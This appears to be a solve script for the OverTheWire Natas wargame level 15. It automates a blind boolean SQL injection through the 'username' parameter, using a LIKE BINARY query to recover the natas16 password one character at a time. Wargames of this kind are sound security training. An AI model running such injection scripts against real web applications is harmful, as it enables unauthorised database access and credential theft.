import requests, os, sys
from pwn import *
from requests.auth import HTTPBasicAuth
import urllib.parse
import string, signal

def get_password(user):
    file = open(f'credentials/{user}', 'r')
    password = file.read().replace('\n', '')
    file.close()
    return password


user = 'natas15'
password = get_password(user) 
url = f"http://{user}.natas.labs.overthewire.org"


def make_request(username):
    auth = HTTPBasicAuth(user, password)
    res = requests.get(url, auth=auth, params={ 'debug': 'true', 'username': username  })
    return res.text


def force_brute_attack():
    
    characters = f'{string.ascii_letters}{string.digits}'
    natas16_pass = ''

    p1 = log.progress('Brute force attack')
    p1.status('Starting attack')
    p2 = log.progress('Password for natas16')
    
    while True:
        found = False
        for c in characters:
            p1.status(f'trying with {c} character')
            injection = f'natas16" AND password LIKE BINARY "{natas16_pass}{c}%" #'
            res = make_request(injection)
            if 'This user exists' in res:
                natas16_pass += c
                p2.status(natas16_pass)
                found = True
                break
        if found == False:
            break
    
    p1.success(f'Password found {natas16_pass}')
    return natas16_pass


def def_handler(sig, frame):
    print('\n\n[*] Exit...\n')
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)



if __name__ == "__main__":
    pass_found = force_brute_attack()
    os.system(f'echo "{pass_found}" > credentials/natas16')
    log.info('Password saved!')


